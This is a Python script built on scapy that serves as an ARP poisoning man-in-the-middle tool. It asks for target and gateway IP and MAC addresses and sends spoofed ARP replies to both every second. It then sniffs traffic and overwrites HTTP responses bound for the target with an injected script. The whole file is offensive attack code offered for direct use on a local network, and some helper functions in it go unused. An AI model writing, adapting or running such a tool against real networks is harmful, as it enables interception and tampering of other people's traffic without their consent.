import time
from scapy.all import ARP, Ether, send, sniff, IP, TCP, Raw
import threading
import sys

# Global variables for target and gateway IP/MAC addresses
target_ip = input("Enter the target IP: ")         # Target IP address
target_mac = input("Enter the target MAC: ")  # Target MAC address
gateway_ip = input("Enter the gateway IP: ")        # Gateway IP address
gateway_mac = input("Enter the gateway MAC") # Gateway MAC address

# Function to perform ARP poisoning (send spoofed ARP replies)
def poison_target(target_ip, target_mac, gateway_ip, gateway_mac):
    # Craft ARP response (spoofed ARP reply)
    arp_response = ARP(op=2, hwsrc=gateway_mac, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip)
    ether_frame = Ether(dst=target_mac) / arp_response
    send(ether_frame, verbose=False)

# Function to continuously poison the target
def continuous_poison():
    while True:
        poison_target(target_ip, target_mac, gateway_ip, gateway_mac)
        poison_target(gateway_ip, gateway_mac, target_ip, target_mac)
        time.sleep(1)  # Send every second to maintain the poison

# Function to capture packets and display them (basic sniffing)
def packet_callback(packet):
    if packet.haslayer(Ether):
        print(f"Captured Packet: {packet.summary()}")

# Function to inject modified packets (e.g., modify HTTP responses)
def inject_packet(packet):
    if packet.haslayer(TCP) and packet.haslayer(IP):
        if packet[IP].dst == target_ip:  # Check if the packet is for the target
            if packet.haslayer(Raw):  # Check if it's a TCP/HTTP packet
                # Modify the packet (Example: Inject JavaScript into HTTP response)
                if b"HTTP" in packet[Raw].load:
                    print("Injecting payload into HTTP response...")
                    new_payload = b"HTTP/1.1 200 OK\r\n\r\n<script>alert('Hacked!');</script>"
                    packet[Raw].load = new_payload
                    send(packet)  # Send the modified packet
                    print("Injected modified packet.")
                else:
                    print("Non-HTTP traffic detected. Skipping modification.")

# Function to start sniffing network traffic
def start_sniffing():
    sniff(prn=packet_callback, filter="ip", store=0)  # Filter to capture only IP packets

# Main function to run the tool
def main():
    print("Starting ARP Poisoning Tool...")

    # Start ARP poisoning in a separate thread
    poison_thread = threading.Thread(target=continuous_poison)
    poison_thread.daemon = True  # Daemon thread will stop when the main program exits
    poison_thread.start()

    # Start sniffing and packet injection in the main thread
    try:
        print("Sniffing packets and injecting payloads (Ctrl+C to stop)...")
        sniff(prn=inject_packet)  # Capture and potentially inject modified packets
    except KeyboardInterrupt:
        print("\nExiting...")

if __name__ == "__main__":
    main()
